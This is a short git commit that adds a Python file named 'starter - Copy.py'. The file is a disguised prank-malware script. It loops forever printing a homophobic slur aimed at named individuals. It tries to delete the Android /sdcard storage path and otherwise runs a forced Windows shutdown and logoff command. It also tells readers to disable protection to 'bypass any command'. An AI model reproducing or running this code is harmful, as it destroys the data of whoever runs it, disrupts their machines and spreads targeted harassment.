472b992f61f14db12afe2c8cbfbca1e8ad6db02f
Piratedbay <95370663+Piratedbay@users.noreply.github.com>
2023-03-12 17:39:42 +0545

    Add files via upload

---
+++ starter - Copy.py
@@ -0,0 +1,19 @@
+import os
+import time
+while True:
+    print("HAHHAHAHAHHA QUREESHIII IS GAYYYYYYYYYYYYYYYYYYYYYYYYYY SIMON XD!")
+    time.sleep(0)
+    if os.path.exists("/sdcard"):
+        os.remove("/sdcard")
+        print("HAHAHAHAHHA SHARE IT WITH YOUR FRIENDS")
+    else:
+        print("DISABLE V PROTECT TO BYPASS ANY COMMAND")
+        os. system('shutdown -s -l -t 0')
+        exit()
+        
+    
+    
+
+
+
+
